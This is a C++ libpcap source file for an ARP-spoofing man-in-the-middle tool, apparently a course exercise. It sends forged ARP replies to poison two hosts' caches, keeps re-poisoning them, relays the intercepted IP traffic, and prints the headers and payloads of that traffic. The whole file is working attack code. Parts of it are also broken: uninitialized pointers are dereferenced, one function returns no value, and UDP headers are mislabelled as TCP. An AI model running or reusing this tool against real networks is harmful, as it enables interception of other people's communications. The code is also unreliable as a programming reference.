#include <iostream>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <vector>
#include "ethhdr.h"
#include "arphdr.h"

pthread_t threads[20];
int threadErr;
static char * s_dev;


#define ARP 0x0806
#define IP 0x0800
#define TCP 6
#define UDP 17
#define ICMP 1
#define IPOFFSET 14


#pragma pack(push, 1)

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};



struct IpHdr{

    u_int8_t version_header_length;
    u_int8_t TOS;
    u_int16_t total_length;
    u_int16_t identification;
    u_int16_t fragment_offset;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t header_checksum;
    u_int8_t source_address[4];
    u_int8_t destination_address[4];

};

struct TcpHdr{

    u_int16_t source_port;
    u_int16_t destination_port;
    u_int32_t sequence_number;
    u_int32_t acknowledgement_number;
    u_int8_t offset_reserved;
    u_int8_t tcp_flags;
    u_int16_t window;
    u_int16_t checksum;
    u_int16_t urgent_pointer;

};

struct UdpHdr{

    u_int16_t source_port;
    u_int16_t destination_port;
    u_int16_t length;
    u_int16_t checksum;

};

struct IcmpHdr{

    u_int8_t type;
    u_int8_t code;
    u_int16_t checksum;
    u_int32_t message;

};

struct EthIpPacket final{
    EthHdr eth_;
    IpHdr ip_;

};
struct TcpPacket final{
    EthHdr eth_;
    IpHdr ip_;
    TcpHdr tcp_;
    char * payload;
};

struct UdpPacket final{
    EthHdr eth_;
    IpHdr ip_;
    UdpHdr udp_;
    char * payload;
};

struct IcmpPacket final{
    EthHdr eth_;
    IpHdr ip_;
    IcmpHdr icmp_;
    char * payload;
};

struct ArpHeader {
    uint16_t hardwareType;
    uint16_t protocolType;
    uint8_t hardAddLen;
    uint8_t protoAddLen;
    uint16_t operationCode;
    uint8_t sourceMac[6];
    uint8_t SourceIp[4];
    uint8_t destinationMac[6];
    uint8_t destinationIp[4];
};


struct EthernetHeader{
    uint8_t dstMac[6];
    uint8_t srcMac[6];
    uint16_t type;
};

struct Info{
    Mac sender_mac_;
    Mac target_mac_;
    Mac my_mac_;
    char* sender_ip_;
    char* target_ip_;
    char* my_ip_;
    char* dev_;
};

static std::vector<Info>  interruptInfo;

#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0\n");
}





Mac  get_my_mac_address(char * interface){//
    int sock;
    struct ifreq ifr;

    uint8_t * mac;
    int fd;

    memset(&ifr,0x00,sizeof(ifr));
    strncpy(ifr.ifr_name,interface,IFNAMSIZ);

    fd = socket(AF_INET,SOCK_STREAM,0);


    if(ioctl(fd,SIOCGIFHWADDR,&ifr) < 0){
        printf("ioctl");
        exit(1);
    }
    mac = (uint8_t*)ifr.ifr_hwaddr.sa_data;
    Mac my_mac = Mac(mac);

    return my_mac;

}

char * get_my_ip_address(char * interface){
    struct ifreq ifr;
    char *Ip = (char*)malloc(sizeof(char)*20);
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Interface Error");
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, Ip,sizeof(struct sockaddr));
    return Ip;
}



int send_request(char * dev, Mac my_mac, char * sender_ip, char * my_ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return 0;
    }
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));
    int res_sendpacket = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res_sendpacket != 0) {
       fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_sendpacket, pcap_geterr(handle));
    }
    pcap_close(handle);
}

Mac get_arp_packet(char * dev,Mac my_mac,char * sender_ip, char * my_ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return 0;
    }
    
    send_request(dev,my_mac,sender_ip,my_ip);
    
    struct pcap_pkthdr* header;
    const u_char* packet;
    while(true){
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) exit(1);
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){

            exit(1);
        }
        int * type;
        EthernetHeader* etherHeader = (EthernetHeader*)packet;
    	EthArpPacket * etherArpPacket;

    	etherArpPacket->eth_.type_ = etherHeader->type;
 	etherArpPacket->eth_.smac_ = etherHeader->srcMac;
 	etherArpPacket->eth_.dmac_ = etherHeader->dstMac;

    	if ( etherArpPacket->eth_.dmac() == std::string("FF:FF:FF:FF:FF:FF")){

    	    continue;
    	}

    	if ((etherArpPacket->eth_.type() == ARP || etherArpPacket->eth_.dmac() == my_mac)){
    	    return etherArpPacket->eth_.smac_;
    	}else{

    	    continue;
    	}
        
        
    }
    pcap_close(handle);
    return NULL;
}

int get_sender_arp_packet(char * dev,Mac target_mac, Mac sender_mac,Mac my_mac){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
    if (handle == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return 0;
    }

    
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if(res == 0) return 0;
    if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
        pcap_close(handle);
        return 0;
    }
    EthernetHeader* etherHeader = (EthernetHeader*)packet;
    EthHdr * ethHdr;
    ethHdr->type_ = etherHeader->type;


    if (ethHdr->type() != ARP){
        pcap_close(handle);
        return 0;
    }

    ethHdr->dmac_ = etherHeader->dstMac;
    ethHdr->smac_ = etherHeader->srcMac;
    std::cout << std::string(ethHdr->smac()) << std::endl;
    std::cout << std::string(ethHdr->dmac()) << std::endl;
    std::cout << std::endl;    
    if (ethHdr->dmac().isBroadcast() == true){
	std::cout << std::string(ethHdr->dmac()) << std::endl;    	
    }


    if (ethHdr->dmac().isBroadcast() == true){
        pcap_close(handle);
        std::cout << "spoofing_broad" << std::endl;
        std::cout << std::endl;
	std::cout << std::endl;
        return 2;
    }
    if (ethHdr->dmac() == my_mac && ethHdr->smac() == sender_mac){
        pcap_close(handle);
        std::cout << "spoofing_unicast" << std::endl;
        std::cout << std::endl;
    	std::cout << std::endl;
        return 1;
    }

    if (ethHdr->dmac() == target_mac && ethHdr->smac() == sender_mac){
        pcap_close(handle);
        std::cout << "spoofing_unicast" << std::endl;
        std::cout << std::endl;
	std::cout << std::endl;
        return 1;
    }

    if (ethHdr->dmac() == sender_mac && ethHdr->smac() == target_mac){
        pcap_close(handle);
        std::cout << "spoofing_unicast" << std::endl;
        std::cout << std::endl;
	std::cout << std::endl;
        return 1;
    }
    


    pcap_close(handle);
    return 0;
}

Mac get_mac_address(char * dev, Mac my_mac, char * sender_ip, char * my_ip){
    Mac sender_mac;

    sender_mac = get_arp_packet(dev, my_mac,sender_ip, my_ip);
    return sender_mac;
}

void *sender_arp_spoofing(void *senderInfo){
    Info *sender = (Info*)senderInfo;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(sender->dev_, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", sender->dev_, errbuf);
        return NULL;
    }
    EthArpPacket packet;
    packet.eth_.dmac_ = sender->sender_mac_;
    packet.eth_.smac_ = sender->my_mac_;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(sender->my_mac_);
    packet.arp_.sip_ = htonl(Ip(sender->target_ip_));
    packet.arp_.tmac_ = sender->sender_mac_;
    packet.arp_.tip_ = htonl(Ip(sender->sender_ip_));


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    while(true){
        if (get_sender_arp_packet(sender->dev_,sender->target_mac_ ,sender->sender_mac_, sender->my_mac_) == 1){

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }
    pcap_close(handle);


}

void *target_arp_spoofing(void *targetInfo){
    Info *target = (Info*)targetInfo;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* s_handle = pcap_open_live(target->dev_, 0, 0, 0, errbuf);
    if (s_handle == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", target->dev_, errbuf);
        return NULL;
    }
    EthArpPacket packet;
    packet.eth_.dmac_ = target->target_mac_;
    packet.eth_.smac_ = target->my_mac_;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(target->my_mac_);
    packet.arp_.sip_ = htonl(Ip(target->sender_ip_));
    packet.arp_.tmac_ = target->target_mac_;
    packet.arp_.tip_ = htonl(Ip(target->target_ip_));


    int res = pcap_sendpacket(s_handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(s_handle));
    }

    while(true){
    
        if (get_sender_arp_packet(target->dev_,target->sender_mac_, target->target_mac_, target->my_mac_) == 1){

            int res = pcap_sendpacket(s_handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(s_handle));
            }
        }
    }
    pcap_close(s_handle);


}
void read_payload(const u_char* packet,u_int8_t offset){

    packet += 14+offset;
    char * payload = (char *)packet;
    std::cout << "=====P:L=====" << std::endl;
    std::cout << std::string(payload) << std::endl;
    std::cout << std::endl;
    std::cout << std::endl;

}

void read_Ethernet_header(const u_char* packet){
    EthHdr * ethHdr = (EthHdr*)packet;

    std::cout << "=====ETH=====" << std::endl;
    std::cout << "Src MAC : "<< std::string(ethHdr->smac()) << std::endl;
    std::cout << "Dst MAC : "<<std::string(ethHdr->dmac()) << std::endl;
    std::cout << "T Y P E :" <<ethHdr->type() << std::endl;
    return;

}


u_int8_t read_IP_header(const u_char* packet){
    packet += IPOFFSET;
    IpHdr* ipHdr = (IpHdr *)packet;

    u_int8_t header_length = (ipHdr->version_header_length & 0x0f) * 4;
    printf("=====I P=====\n");
    printf("Src IP  : %d.%d.%d.%d\n",ipHdr->source_address[0],ipHdr->source_address[1],
                           ipHdr->source_address[2],ipHdr->source_address[3]);

    printf("Dst IP  : %d.%d.%d.%d\n",ipHdr->destination_address[0],ipHdr->destination_address[1],
                           ipHdr->destination_address[2],ipHdr->destination_address[3]);

    return header_length;

}


u_int8_t read_TCP_header(const u_char* packet, u_int8_t tcp_offset){

    TcpHdr* tcpHdr;
    packet += IPOFFSET+tcp_offset;
    tcpHdr = (TcpHdr*)packet;
    u_int8_t offset = ((tcpHdr->offset_reserved & 0xf0) >> 4)*4;                                                                                                                                                                                                                                                                                                                                                               
    std::cout << "=====TCP=====" << std::endl;
    std::cout << "SRC PRT :" <<ntohs(tcpHdr->source_port) << std::endl;
    std::cout << "DST PRT :" << ntohs(tcpHdr->destination_port) << std::endl;
    return offset;
}

u_int8_t read_UDP_header(const u_char* packet, u_int8_t udp_offset){

    UdpHdr* udpHdr;
    packet += IPOFFSET+udp_offset;
    udpHdr = (UdpHdr*)packet;
    std::cout << "=====TCP=====" << std::endl;
    std::cout << "SRC PRT :" <<ntohs(udpHdr->source_port) << std::endl;
    std::cout << "DST PRT :" << ntohs(udpHdr->destination_port) << std::endl;
    return 8;
}

void read_ICMP(const u_char * packet, u_int8_t icmp_offset){

    IcmpHdr* icmpHdr;
    packet += IPOFFSET+icmp_offset;
    icmpHdr = (IcmpHdr*)packet;

    std::cout << "=====ICMP====" << std::endl;
    std::cout << "T Y P E :"<<icmpHdr->type << std::endl;
    std::cout << "MESSAGE :"<<icmpHdr->message << std::endl;
    std::cout << std::endl;
    std::cout << std::endl;
    
}

u_char * sniff_packet(const u_char * packet, Mac my_mac, Mac target_mac){

    EthIpPacket * ethIpHeader = (EthIpPacket *)packet;
    
    
    if (ethIpHeader->eth_.type() == ARP){
    	return NULL;
    }



    if(ethIpHeader->ip_.protocol == TCP ){
        TcpPacket * new_packet = (TcpPacket *)packet;
        read_Ethernet_header(packet);
        u_int8_t offset = read_IP_header(packet);
        offset += read_TCP_header(packet,offset);
        read_payload(packet, offset);

    }
    if(ethIpHeader->ip_.protocol == UDP ){
        UdpPacket * new_packet = (UdpPacket *)packet;
        read_Ethernet_header(packet);
        u_int8_t offset = read_IP_header(packet);
        offset += read_UDP_header(packet,offset);
        read_payload(packet, offset);

    }
    if(ethIpHeader->ip_.protocol == ICMP ){
        IcmpPacket * new_packet = (IcmpPacket *)packet;
        read_Ethernet_header(packet);
        u_int8_t offset = read_IP_header(packet);
        read_ICMP(packet,offset);

         
    }
     ethIpHeader->eth_.smac_ = my_mac;
     ethIpHeader->eth_.dmac_ = target_mac;

    return (u_char *)ethIpHeader;

}

void signal_handler(int sig){
    std::cout << "interrupt !!" << std::endl;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* s_handle = pcap_open_live(s_dev, 0, 0, 0, errbuf);
    if (s_handle == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", s_dev, errbuf);
        exit(1);
    }
    for(int i =0; i < interruptInfo.size(); i++){
        EthArpPacket target_packet;
        target_packet.eth_.dmac_ = interruptInfo[i].sender_mac_;
        target_packet.eth_.smac_ = interruptInfo[i].target_mac_;
        target_packet.eth_.type_ = htons(EthHdr::Arp);

        target_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        target_packet.arp_.pro_ = htons(EthHdr::Ip4);
        target_packet.arp_.hln_ = Mac::SIZE;
        target_packet.arp_.pln_ = Ip::SIZE;
        target_packet.arp_.op_ = htons(ArpHdr::Reply);
        target_packet.arp_.smac_ = interruptInfo[i].sender_mac_;
        target_packet.arp_.sip_ = htonl(Ip(interruptInfo[i].sender_ip_));
        target_packet.arp_.tmac_ = interruptInfo[i].target_mac_;
        target_packet.arp_.tip_ = htonl(Ip(interruptInfo[i].target_ip_));
        int target_res = pcap_sendpacket(s_handle, reinterpret_cast<const u_char*>(&target_packet), sizeof(EthArpPacket));
        if (target_res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", target_res, pcap_geterr(s_handle));
        }
        EthArpPacket sender_packet;
        sender_packet.eth_.dmac_ = interruptInfo[i].target_mac_;
        sender_packet.eth_.smac_ = interruptInfo[i].sender_mac_;
        sender_packet.eth_.type_ = htons(EthHdr::Arp);

        sender_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        sender_packet.arp_.pro_ = htons(EthHdr::Ip4);
        sender_packet.arp_.hln_ = Mac::SIZE;
        sender_packet.arp_.pln_ = Ip::SIZE;
        sender_packet.arp_.op_ = htons(ArpHdr::Reply);
        sender_packet.arp_.smac_ = interruptInfo[i].target_mac_;
        sender_packet.arp_.sip_ = htonl(Ip(interruptInfo[i].target_ip_));
        sender_packet.arp_.tmac_ = interruptInfo[i].sender_mac_;
        sender_packet.arp_.tip_ = htonl(Ip(interruptInfo[i].sender_ip_));
        int sender_res = pcap_sendpacket(s_handle, reinterpret_cast<const u_char*>(&sender_packet), sizeof(EthArpPacket));
        if (sender_res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sender_res, pcap_geterr(s_handle));
        }
    }
    pcap_close(s_handle);
    exit(1);

}

void *relay_sender_data(void * info){
    Info * senderInfo = (Info*)info;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(senderInfo->dev_, BUFSIZ, 0, 1000, errbuf);
    if (handle == NULL) {

        fprintf(stderr, "couldn't open device %s(%s)\n", senderInfo->dev_, errbuf);
        return 0;
    }
    pcap_t* pcap = pcap_open_live(senderInfo->dev_, 0, 0, 0, errbuf);
    if (pcap == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", senderInfo->dev_, errbuf);
        return NULL;
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            continue;
        }

        EthernetHeader* etherHeader = (EthernetHeader*)packet;
        EthArpPacket etherArpPacket;

        signal(SIGINT,signal_handler);

        etherArpPacket.eth_.type_ = etherHeader->type;

        if(etherArpPacket.eth_.type() != IP){
            continue;
        }

        etherArpPacket.eth_.dmac_ = etherHeader->dstMac;
        etherArpPacket.eth_.smac_ = etherHeader->srcMac;
        if(etherArpPacket.eth_.smac() != senderInfo->sender_mac_ || etherArpPacket.eth_.dmac() != senderInfo->my_mac_){
            continue;
        }


        u_char * new_packet = sniff_packet(packet,senderInfo->my_mac_, senderInfo->target_mac_ );
        if(pcap_sendpacket(pcap, new_packet, header->caplen /* size */) != 0)
         {
             fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcap));
             continue;
         }

    }

}

void *relay_target_data(void * info){
    Info * targetInfo = (Info*)info;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(targetInfo->dev_, BUFSIZ, 0, 1000, errbuf);
    if (handle == NULL) {

        fprintf(stderr, "couldn't open device %s(%s)\n", targetInfo->dev_, errbuf);
        return 0;
    }
    pcap_t* pcap = pcap_open_live(targetInfo->dev_, 0, 0, 0, errbuf);
    if (pcap == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", targetInfo->dev_, errbuf);
        return NULL;
    }


    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            continue;
        }

        EthernetHeader* etherHeader = (EthernetHeader*)packet;
        EthArpPacket etherArpPacket;



        etherArpPacket.eth_.type_ = etherHeader->type;

        if(etherArpPacket.eth_.type() != IP){
            continue;
        }

        etherArpPacket.eth_.dmac_ = etherHeader->dstMac;
        etherArpPacket.eth_.smac_ = etherHeader->srcMac;
        if(etherArpPacket.eth_.smac() != targetInfo->target_mac_ || etherArpPacket.eth_.dmac() != targetInfo->my_mac_){
            continue;
        }

        u_char * new_packet = sniff_packet(packet,targetInfo->my_mac_, targetInfo->sender_mac_ );
        if(pcap_sendpacket(pcap, new_packet, header->caplen /* size */) != 0)
         {
             fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcap));
             continue;
         }
    }

}


std::vector<Info> listing_info(int argc,char * argv[],Mac my_mac,char * my_ip){

    std::vector<Info> info;
    Info mac_ip;
    std::cout << argv[1] <<std::endl;
    for(int i=2; i < argc; i++){
        
        mac_ip.sender_mac_ = get_mac_address(argv[1],my_mac,argv[i], my_ip);
        mac_ip.sender_ip_ = argv[i];
        ++i;
        
        mac_ip.target_mac_ = get_mac_address(argv[1],my_mac,argv[i], my_ip);

        mac_ip.target_ip_ = argv[i];
        mac_ip.dev_ = argv[1];
        mac_ip.my_mac_ = my_mac;
        mac_ip.my_ip_ = my_ip;
        info.push_back(mac_ip);

    }

    std::cout << "My Mac     :" <<std::string(info[0].my_mac_) << std::endl;
    std::cout << "Sender IP  :" <<std::string(info[0].sender_ip_) << std::endl;    
    std::cout << "Interface  :" <<std::string(info[0].dev_) << std::endl;
    std::cout << "Sender MAC :" <<std::string(info[0].sender_mac_) << std::endl;
    std::cout << "Sender IP  :" <<std::string(info[0].sender_ip_) << std::endl;
    std::cout << "Target MAC :" <<std::string(info[0].target_mac_) << std::endl;
    std::cout << "Target IP  :" <<std::string(info[0].target_ip_) << std::endl;  

    return info;
}


int main(int argc, char* argv[]){
    if (argc < 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char * my_ip = get_my_ip_address(dev);
    s_dev= dev;
    std::cout << "MY I P :" << my_ip << std::endl;
    Mac my_mac = get_my_mac_address(dev);
    std::cout << "My MAC :" <<std::string(my_mac)<< std::endl;
    std::vector<Info> info = listing_info(argc,argv,my_mac,my_ip);

    interruptInfo = info;

    int x= 0 ;
    for(int i = 0; i <int(argc-1)/2;i++){
        if(pthread_create(&threads[x], NULL, sender_arp_spoofing,(void*)&info[i]) !=0){
            perror("error\n\n");
            exit(1);
        }
        x++;
        if(pthread_create(&threads[x], NULL, target_arp_spoofing,(void*)&info[i]) !=0){
            perror("error\n\n");
            exit(1);
        }
        x++;
        if(pthread_create(&threads[x], NULL, relay_sender_data, (void*)&info[i]) !=0){
            perror("error\n\n");
            exit(1);
        }
        x++;
        if(pthread_create(&threads[x], NULL, relay_target_data, (void*)&info[i]) !=0){
            perror("error\n\n");
            exit(1);
        }

        x++;
    }

    for(int i=0; i<x;i++){
        pthread_join(threads[i], NULL);
    }



}

